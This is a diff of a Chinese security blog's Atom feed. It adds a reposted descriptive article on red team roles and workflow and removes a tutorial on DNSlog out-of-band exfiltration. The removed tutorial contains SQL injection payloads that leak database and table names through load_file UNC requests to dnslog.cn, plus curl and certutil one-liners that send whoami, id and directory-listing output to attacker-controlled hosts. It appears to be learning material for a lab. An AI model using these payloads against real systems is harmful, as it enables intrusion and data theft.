@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://Morn-zh.github.io</id>
     <title>Morn-zh</title>
-    <updated>2021-05-09T15:37:15.232Z</updated>
+    <updated>2021-05-13T11:55:13.180Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://Morn-zh.github.io"/>
     <link rel="self" href="https://Morn-zh.github.io/atom.xml"/>
@@ -10,6 +10,48 @@
     <logo>https://Morn-zh.github.io/images/avatar.png</logo>
     <icon>https://Morn-zh.github.io/favicon.ico</icon>
     <rights>All rights reserved 2021, Morn-zh</rights>
+    <entry>
+        <title type="html"><![CDATA[我眼中的红队（转载）]]></title>
+        <id>https://Morn-zh.github.io/post/wo-yan-zhong-de-hong-dui-zhuan-zai/</id>
+        <link href="https://Morn-zh.github.io/post/wo-yan-zhong-de-hong-dui-zhuan-zai/">
+        </link>
+        <updated>2021-05-12T10:38:05.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="我眼中的红队">我眼中的红队</h1>
+<p>仅聊一聊我自己眼中的红队，如有异议请指教。</p>
+<p>作者：林晨</p>
+<h2 id="关于红队">关于红队</h2>
+<p>红队：通常指攻防演习中的攻击方</p>
+<h2 id="红队评估">红队评估</h2>
+<p>在聊红队结构的组成之前我们需要了解红队评估的简单流程和技术手段。</p>
+<h3 id="红队评估流程">红队评估流程</h3>
+<p>1.打点：通过弱口令、文件上传、命令执行、社工等技术手段对Web、App、IoT等一切暴露在互联网的服务和个人PC等防守方内部机器进行外部攻击，并尝试获取内网入口权限也就是当前被攻击服务所在系统的权限；</p>
+<p>2.横向：获取到内网入口权限后对当前主机的开放端口、运行进程、配置密码、内网网段、域等一切有价值的信息进行收集，并对收集到的信息进行分析、关联、整合并结合相关的技术手段进一步的对内网主机进行漏洞发现、权限和数据获取等操作；</p>
+<p>3.报告：将红队评估过程中所涉技术手段、安全风险、所涉单位等信息进行梳理，整合成文档报告用于项目交付和复盘总结。</p>
+<h2 id="红队结构">红队结构</h2>
+<p>在一般的攻防演习活动中所需的红队人员数为三人，三人分别是：队长、渗透师、横向师。</p>
+<p>红队人员都应涉及较为全面的技术领域，除此之外可以细分三人的技术领域和应有的能力。</p>
+<p>队长：技术综合能力较强，应具备较好的团队协作能力、组织能力、应变能力；</p>
+<p>渗透师：前渗透能力较强，在演习过程中需能“稳、狠、准、快”的寻找到边界点并进行突破（打点）；</p>
+<p>横向师：后渗透能力较强，根据渗透师的打点结果进行梳理，横向渗透其他内网服务和主机，全面的评估内网的安全体系。</p>
+<h2 id="红队建设">红队建设</h2>
+<p>建立一支优秀的红队所需：人员、武器库、漏洞库</p>
+<p>1.人员：招聘、公司内部转换、人才培养；</p>
+<p>2.武器库建设：将红队评估参与的人员比喻成一线，那么建设武器库的人员就是二线，二线人员不需要直接参与到红队评估中，但需要起到支撑作用；例如将一线人员的需求进行工具、脚本化的转变；</p>
+<p>3.漏洞库建设：同上所述漏洞库的建设也离不开人员，除了红队评估人员自我产出的通用漏洞积累除外，还需要一批专门做漏洞研究的人员作为二线进行漏洞研究，以便于一线评估人员更“快速”的进行攻防。</p>
+<h3 id="准备工作">准备工作</h3>
+<p>协作平台<br>
+俗话说的好“三个臭皮匠顶一个诸葛亮”，红队评估这件事情从来都不是一个人的“战斗”，它需要团队协作共同完成。</p>
+<p>每个红队成员都有自己较为熟悉的技术领域，这也就导致了每个人所“打”的点和所“看”的面不同，要想全面的进行评估工作就需要协作平台将每个人的信息进行汇总便于每个人都能接触到“不同面”的信息。</p>
+<h3 id="协作平台的推荐">协作平台的推荐：</h3>
+<p>1.Codimd - https://github.com/hackmdio/codimd （Markdown文档协作平台）</p>
+<p>2.CobaltStrike - https://www.cobaltstrike.com （后渗透团队协作平台）</p>
+<h3 id="成员">成员</h3>
+<p>1.队长：与主办方沟通了解比赛时间、比赛规则，有时可针对“规则漏洞”制定攻击方案；搭建所需的协作平台；</p>
+<p>2.渗透师：应将前渗透中的通用技术手段（外网开放端口、服务弱口令扫描、信息泄露）转换为工具进行一键批量自动化，也可在规则允许的情况下准备对应的扫描器（通常目标几百、上千个的情况下没有精力一个一个的手工查看）；</p>
+<p>3.横向师：应将内网的弱口令扫描、端口扫描、高危漏洞扫描等操作转换为工具进行一键批量自动化，避免在后期的横向中浪费大量的不必要时间。</p>
+<p>转载自：https://gh0st.cn/archives/2019-09-21/1</p>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[信息收集之shodan]]></title>
         <id>https://Morn-zh.github.io/post/xin-xi-shou-ji-zhi-shodan/</id>
@@ -641,93 +683,6 @@ site:xx.com inurl:load</p>
 <p>1、采用高性能的网络设备</p>
 <p>2、高带宽</p>
 <p>3、安装防火墙</p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[DNSlog的使用]]></title>
-        <id>https://Morn-zh.github.io/post/dnslog-de-shi-yong/</id>
-        <link href="https://Morn-zh.github.io/post/dnslog-de-shi-yong/">
-        </link>
-        <updated>2021-04-20T07:25:49.000Z</updated>
-        <content type="html"><![CDATA[<h1 id="dnslog的使用">DNSlog的使用</h1>
-<h2 id="原理">原理</h2>
-<p>DNS服务器解析域名的时候会留下log日志，如果DNS服务器是自己的，那么我们就可以从log信息中获得信息</p>
-<h2 id="应用场景">应用场景</h2>
-<p>1、SQL注入中的盲注</p>
-<p>2、无回显的命令执行</p>
-<p>3、无回显的SSRF</p>
-<h2 id="使用到的函数">使用到的函数</h2>
-<p>load_file()函数</p>
-<p>load_file()使用限制：</p>
-<p>1.文件必须位于服务器主机上。</p>
-<p>2.当前用户必须具有读取文件的权限</p>
-<pre><code>select * from mysql.user where user='user_name';
-</code></pre>
-<p>3.文件的大小小于max_allowed_packet字节。（暂时不清楚实际渗透过程中会不会遇到</p>
-<p>4.读取的文件位于secure_file_priv设置的范围内</p>
-<pre><code>SHOW VARIABLES LIKE 'secure_file_priv';
-</code></pre>
-<p>Q：为什么要用load_file函数呢？</p>
-<p>A：因为load_file函数可以解析dns请求。</p>
-<p>数据库中使用此payload：select load_file('\\SQL注入查询语句.a.com')</p>
-<p>注意：load_file函数在Linux下是无法用来做dnslog攻击的，因为在这里就涉及到Windows的一个小Tips——UNC路径。</p>
-<h2 id="环境">环境</h2>
-<p>dnslog.cn</p>
-<p>sqli-labs-Less-5</p>
-<h2 id="实践">实践</h2>
-<p>判断存在注入，并且无明显回显，这里我们考虑下使用DNSlog</p>
-<h3 id="获取dns域名">获取DNS域名</h3>
-<p>先访问<a href="dnslog.cn">dnslog.cn</a>，谷歌浏览器，似乎需要翻墙</p>
-<p>获得一个域名</p>
-<p>这里我获得的域名是：4325u7.dnslog.cn</p>
-<h3 id="注入开始">注入开始</h3>
-<p>payload：</p>
-<pre><code>http://127.0.0.1/sqli-lab/Less-5/?id=1' and if((select load_file(concat('\\\\',(select database()),'.4325u7.dnslog.cn\\aaa'))),1,1)--+
-</code></pre>
-<p>页面会加载一会儿，可能是网络原因</p>
-<p>查看DNSlog信息</p>
-<figure data-type="image" tabindex="1"><img src="https://Morn-zh.github.io/post-images/dnslog/QQ%E6%88%AA%E5%9B%BE20210420150952.png" alt="QQ截图20210420150952" loading="lazy"></figure>
-<p>可以看到，数据库名信息就会放到和域名信息一起被记录到DNSlog里面了</p>
-<p>查看表名</p>
-<pre><code>' and if((select load_file(concat('\\\\',(select table_name from information_schema.tables where table_schema=database() limit 0,1),'.4325u7.dnslog.cn\\aaa'))),1,1)--+
-</code></pre>
-<p>……</p>
-<h2 id="搭建dnslog服务器">搭建DNSlog服务器</h2>
-<p>这⾥推荐BugScanTeam的 https://github.com/BugScanTeam/DNSLog ，该项⽬主页是有搭建教程的，按⾃⼰的 需求搭建。</p>
-<h2 id="使用中间件日志">使用中间件日志</h2>
-<p>除了DNS的log，在可以执⾏系统命令的情况还可以利⽤HTTP的log，就是通过<strong>中间件的⽇志</strong>来获取结果。</p>
-<h4 id="linux">Linux</h4>
-<pre><code>for /F &quot;delims=\&quot; %i in ('whoami') do curl https://www.yourweb.net/%i 
-</code></pre>
-<p>如果碰到内容有空格（换⾏符等），就会截断，只输出前⾯的，这时候可以利⽤编码来输出，但有输出字符数最⼤ 限制；</p>
-<pre><code>curl http://xxx.dnslog.link/$(id|base64)
-curl http://xxx.dnslog.link/`id|base64`
-</code></pre>
-<h4 id="windows">windows</h4>
-<p>#启动浏览器访问</p>
-<pre><code>for /F %x in ('whoami') do start https://yourweb.net/%x
-</code></pre>
-<p>#内置命令⾏⼯具访问</p>
-<pre><code>for /F %x in ('whoami') do certutil.exe -urlcache -split -f https://www.yourweb.net/%x
-</code></pre>
-<p>#只列出⽂件名</p>
-<pre><code>for /F %x in ('dir /b') do certutil.exe -urlcache -split -f https://www.yourweb.net/%x
-</code></pre>
-<p>windows下的base64编码</p>
-<p>暂时未找到能直接像Linux那样可以通过管道来加密的，但通过多次命令的执⾏达到先base64加密，再做HTTP请求</p>
-<pre><code>whoami &gt; result.txt
-certutil -encode result.txt result_bs64
-for /f %x in (result_bs64) do certutil.exe -urlcache -split -f http://www.yourweb.net/%x
-</code></pre>
-<p>每⼀个请求都会出现两个请求⽇志，所以要去重复！</p>
-<p>并把结果保存为result_bs64_local ，然后再把这个result_bs64_local ⾥⾯加密的⽂件内容解密，命令为：</p>
-<pre><code>certutil -decode result_bs64_local result_local.txt
-</code></pre>
-<h2 id="总结">总结</h2>
-<p>参考文章：</p>
-<p>https://www.cnblogs.com/sunny11/p/14399420.html</p>
-<p>后续需要看:</p>
-<p><a href="https://www.cnblogs.com/sunny11/p/14522023.html">Getshell的姿势总结</a></p>
 ]]></content>
     </entry>
 </feed>
